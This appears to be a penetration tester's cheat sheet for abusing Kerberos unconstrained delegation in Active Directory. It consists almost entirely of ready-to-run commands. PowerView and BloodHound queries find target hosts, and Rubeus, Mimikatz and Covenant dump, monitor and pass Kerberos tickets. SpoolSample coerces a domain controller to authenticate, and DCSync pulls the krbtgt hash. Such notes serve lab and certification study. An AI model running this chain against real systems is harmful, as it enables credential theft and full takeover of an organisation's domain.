## Powerview
```
Get-DomainComputer -Unconstrained
```

## BloodHound
```
MATCH (c:Computer {unconstraineddelegation:true }) RETURN c
```

## CobaltStrike
```
execute-assembly C:\tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10
[System.IO.File]::WriteAllBytes("Z:\backup\PTA\CRTE\tgt-sqladmin", [System.Convert]::FromBase64String($a))
```

## Covenant
```
Rubeus triage /luid:0x3c6cd2
Rubeus dump /luid:0x3c6cd2 /nowrap
Rubeus monitor /interval:5 /filteruser:[Name of DC]$
Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
Rubeus ptt /luid:0x21d8e17 /ticket:[...snip...]
ImpersonateProcess 2768
```

## Mimikatz
```
privilege::debug sekurlsa::tickets
sekurlsa::tickets /export
kerberos::ptt [filename]
```

## spoolss to DC
```
execute-assembly C:\tools\SpoolSample\SpoolSample\bin\Release\Working_SpoolSample.exe [FROM] [TO] 
Assembly /assemblyname:"SpoolSample" /parameters:"CDC01 APPSRV01"
```

* check if running
```
PowerShell dir \\cdc01\pipe\spoolss
```

* fix format
```
tr -d '\040\011\012\015'
```

* Covenant
```
Rubeus monitor /interval:5 /filteruser:[Name of DC]$
Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
Rubeus ptt /luid:0x21d8e17 /ticket:[...snip...]
ImpersonateProcess 2768
```

* mimikatz
```
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
```

* Covenant
```
DCSync prod\krbtgt
```

* https://github.com/dirkjanm/krbrelayx

